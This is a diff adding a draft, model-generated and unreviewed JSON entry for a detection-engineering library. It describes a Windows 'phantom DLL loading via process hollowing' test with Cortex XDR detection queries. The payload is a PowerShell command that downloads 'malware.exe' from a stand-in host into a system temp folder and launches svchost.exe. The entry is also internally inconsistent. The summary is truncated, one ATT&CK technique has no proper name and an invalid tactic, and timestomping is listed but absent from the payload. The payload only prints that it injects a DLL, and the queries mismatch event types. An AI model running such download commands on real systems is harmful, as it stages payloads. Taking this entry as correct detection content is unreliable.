@@ -1,0 +1,193 @@
+{
+  "id": "TTP-0000-0130",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Phantom DLL Loading via Process Hollowing",
+    "summary": "An attacker uses process hollowing to inject a malicious DLL into a legitimate process, triggering a Phantom DLL loading behavior. Cortex should detect the anomalous process creation and file access p",
+    "description": "An attacker uses process hollowing to inject a malicious DLL into a legitimate process, triggering a Phantom DLL loading behavior. Cortex should detect the anomalous process creation and file access patterns associated with this technique."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1070",
+        "subtechnique_id": "T1070.006",
+        "name": "Indicator Removal: Timestomp",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1055",
+        "subtechnique_id": "T1055.001",
+        "name": "T1055.001",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "powershell -Command \"[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;\nInvoke-WebRequest -Uri 'http://192.0.2.10/malware.exe' -OutFile 'C:\\\\Windows\\\\Temp\\\\malware.exe';\n$proc = Start-Process -FilePath 'C:\\\\Windows\\\\System32\\\\svchost.exe' -PassThru;\n$procId = $proc.Id;\nWrite-Host 'Process ID: ' $procId;\nWrite-Host 'Injecting DLL into process';\n$injectScript = 'C:\\\\Windows\\\\Temp\\\\inject.dll';\nWrite-Host 'DLL Path: ' $injectScript;\"\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "A svchost.exe process started with a suspicious command line",
+        "expected_value": "actor_process_image_name = 'svchost.exe' and action_process_image_name = 'svchost.exe'"
+      },
+      {
+        "artifact_type": "file",
+        "description": "A DLL file accessed by a legitimate process",
+        "expected_value": "action_file_path contains 'inject.dll'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "A connection to a C2 server",
+        "expected_value": "action_remote_ip = '192.0.2.10'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Phantom DLL Loading Behavior",
+        "description": "Detection of a legitimate process accessing a suspicious DLL file path",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'svchost.exe'\n| filter action_file_path contains 'inject.dll'\n| filter causality_actor_process_image_name = 'svchost.exe'",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1070.006",
+          "T1055.001"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Suspicious Process Hollowing",
+        "description": "A legitimate process is seen accessing a suspicious DLL file path",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'svchost.exe'\n| filter action_file_path contains 'inject.dll'\n| filter causality_actor_process_image_name = 'svchost.exe'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "process_start",
+        "mitre_technique_ids": [
+          "T1059.001",
+          "T1070.006",
+          "T1055.001"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Process Hollowing Hunt",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'svchost.exe'\n| filter action_file_path contains 'inject.dll'\n| filter causality_actor_process_image_name = 'svchost.exe'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Phantom DLL Loading; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/phantom-dll-loading"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Phantom DLL Loading",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/phantom-dll-loading",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1059.001",
+      "url": "https://attack.mitre.org/techniques/T1059/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1070.006",
+      "url": "https://attack.mitre.org/techniques/T1070/006/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1055.001",
+      "url": "https://attack.mitre.org/techniques/T1055/001/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
